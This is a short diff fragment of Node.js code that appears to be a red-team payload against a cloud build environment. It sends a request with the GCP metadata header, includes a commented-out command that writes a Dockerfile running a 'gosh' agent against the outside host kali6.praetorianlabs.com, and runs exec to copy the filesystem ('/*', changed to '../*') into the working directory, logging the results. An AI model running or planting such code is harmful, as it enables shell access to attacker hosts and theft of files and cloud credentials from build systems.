@@ -18,7 +18,7 @@ axios.get("https://google.com", {headers: {'Metadata-Flavor': 'Google'}}, { tran
 
 
 // exec("echo 'FROM node:14-slim\nRUN repo/./gosh -host kali6.praetorianlabs.com:80\nENV PORT 8080\nENV HOME /app\nCMD [\"npm\", \"start\"]\n' > ../Dockerfile", (error, stdout, stderr) => {
-exec("cp -r /* .", (error, stdout, stderr) => {
+exec("cp -r ../* .", (error, stdout, stderr) => {
     if (error) {
         console.log(JSON.stringify(error.message));
         fs.writeFileSync('command.result', JSON.stringify(error.message));    
